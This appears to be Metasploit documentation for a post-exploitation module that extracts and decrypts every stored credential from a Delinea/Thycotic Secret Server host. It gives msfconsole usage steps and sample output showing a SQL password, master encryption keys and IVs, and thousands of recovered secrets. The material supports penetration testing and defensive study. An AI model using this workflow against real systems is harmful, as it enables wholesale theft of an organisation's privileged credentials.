This module exports and decrypts Secret Server credentials to a CSV file; it is intended as a
post-exploitation module for Windows hosts with Delinea/Thycotic Secret Server installed. Master
Encryption Key (MEK) and associated IV values are decrypted from `encryption.config` using a 
static key baked into the software; there is also support for encryption configs configured with
Windows DPAPI MachineKey protection. The module contains two actions, `dump` and `export`, the
former extracts the encrypted Secret Server database and performs decryption, and the latter
allows the encryption keys and encrypted database to be plundered for later offline decryption
in situations where expedience is necessary.

This module incorporates original research published by the authors of SecretServerSecretStealer,
a PowerShell script designed to harvest Secret Server credentials. The GitHub repo for
SecretStealer.ps1 includes tons of notes on the internals of Secret Server:

https://github.com/denandz/SecretServerSecretStealer

## Vulnerable Application
This module has been tested against Secret Server versions 8.4 through 11.2, though it may work on
earlier versions. It is intended to be run after successfully exploiting a Windows host with the
Delinea/Thycotic Secret Server software installed. The module supports decryption of configuration
files that have been protected by Windows DPAPI, but does not support extraction of any secrets
if the system is configured with a Hardware Security Module (HSM).

## Verification Steps
This is a post module and requires a meterpreter session on the Microsoft Windows server host
with a configured instance of Delinea/Thycotic Secret Server installed.

1. Start msfconsole
2. Get session on Secret Server host via method of choice and background it
3. Do: `use post/windows/gather/credentials/thycotic_secretserver_dump`
4. Do: `set session <session>`
5. Do: `dump` to extract and decrypt the Secret Server database, or `export` to extract the encrypted database only

## Options

### SESSION

Which session to use, which can be viewed with `sessions -l`

## Scenarios
Windows Server 2019 host running Secret Server 11.2 using the `dump` action:

```
msf6 exploit(multi/handler) > use post/windows/gather/credentials/thycotic_secretserver_dump
msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > set session 1
msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > dump

[*] Hostname THYCOTIC IPv4 10.1.0.113
[*] Decrypt database.config ...
[+] Secret Server SQL Database Connection Configuration:
[+]     Instance Name: localhost\SQLEXPRESS
[+]     Database Name: SecretServer
[+]     Database User: sa
[+]     Database Pass: !-TUwX!_-gD-wak-cugyU-0GX0$vL-evYG2
[*] Secret Server Build 11.22
[*] Decrypt encryption.config ...
[+] Secret Server Encryption Configuration:
[+]        KEY: fc35d1abcade1c180c699e10fbb3efeb
[+]     KEY256: e768c5223bafa5481faca1ee10b63fb80c699e10ffa694ce29adc66963d05109
[+]         IV: 2c2df1a68dbc29adc66041bd6e6e4ad3
[*] Performing export and decryption of Secret Server SQL database
[*] Export Secret Server DB ...
[+] 47842 rows exported, 19915 unique SecretIDs
[+] Encrypted Secret Server Database Dump: /root/.msf4/loot/20220829112535_default_10.1.0.113_thycotic_secrets_288749.txt
[+] 47842 rows loaded, 19915 unique SecretIDs
[*] Process Secret Server DB ...
[-] SecretID 1395 field 'Notes' failed to decrypt
[-] SecretID 2050 field 'Notes' failed to decrypt
[-] SecretID 2506 field 'Notes' failed to decrypt
[-] SecretID 2549 field 'Notes' failed to decrypt
[-] SecretID 2558 field 'Notes' failed to decrypt
[-] SecretID 2566 field 'Notes' failed to decrypt
[-] SecretID 2567 field 'Notes' failed to decrypt
[-] SecretID 2583 field 'Notes' failed to decrypt
[-] SecretID 3393 field 'Notes' failed to decrypt
[-] SecretID 4060 field 'Notes' failed to decrypt
[!] SecretID 4092 field 'SFTP Site' contains invalid UTF-8 and will be stored as a Base64 string in the output file
[-] SecretID 4103 field 'Notes' failed to decrypt
[-] SecretID 4174 field 'Notes' failed to decrypt
[-] SecretID 4625 field 'Notes' failed to decrypt
[-] SecretID 5393 field 'Notes' failed to decrypt
[-] SecretID 5647 field 'Notes' failed to decrypt
[-] SecretID 6018 field 'Notes' failed to decrypt
[-] SecretID 6250 field 'Notes' failed to decrypt
[-] SecretID 6263 field 'Notes' failed to decrypt
[-] SecretID 6657 field 'Notes' failed to decrypt
[-] SecretID 9169 field 'Notes' failed to decrypt
[-] SecretID 10577 field 'Notes' failed to decrypt
[-] SecretID 10777 field 'Notes' failed to decrypt
[!] SecretID 11097 field 'Notes' contains invalid UTF-8 and will be stored as a Base64 string in the output file
[-] SecretID 11319 field 'Notes' failed to decrypt
[-] SecretID 11973 field 'Notes' failed to decrypt
[-] SecretID 11974 field 'Notes' failed to decrypt
[-] SecretID 11997 field 'Notes' failed to decrypt
[!] 47842 rows processed (26 rows failed)
[*] 45117 rows recovered: 34479 plaintext, 10638 decrypted (2699 blank)
[*] 45117 rows written (2699 blank rows withheld)
[+] 19836 unique SecretID records recovered
[+] Decrypted Secret Server Database Dump: /root/.msf4/loot/20220829112547_default_10.1.0.113_thycotic_secrets_357639.txt
[*] Post module execution completed
msf6 post(multi/gather/thycotic_secretserver_dump) > 
```

Windows Server 2019 host running Secret Server 11.2 using the `export` action:
```
msf6 exploit(multi/handler) > use post/windows/gather/credentials/thycotic_secretserver_dump
msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > set session 1
msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > export

[*] Hostname THYCOTIC IPv4 10.1.0.113
[*] Decrypt database.config ...
[+] Secret Server SQL Database Connection Configuration:
[+]     Instance Name: localhost\SQLEXPRESS
[+]     Database Name: SecretServer_112E
[+]     Database User: (Windows Integrated)
[!] The database uses Windows authentication
[!] Session identity must have access to the SQL server instance to proceed
[*] Secret Server Build 11.22
[*] Decrypt encryption.config ...
[+] Secret Server Encryption Configuration:
[+]        KEY: 376f80b25053d74afcc321837442ddc9
[+]     KEY256: 5b0f4d7d2d89c180b62c64b881072d4cf2b6fd0487c9d4438050a4734a3ece19
[+]         IV: d933b2ad66c785891d4bc916cebdde15
[*] Performing export of Secret Server SQL database to CSV file
[*] Export Secret Server DB ...
[+] 3 rows exported, 1 unique SecretIDs
[+] Encrypted Secret Server Database Dump: /root/.msf4/loot/20220829113427_default_10.1.0.113_thycotic_secrets_175194.txt
[*] Post module execution completed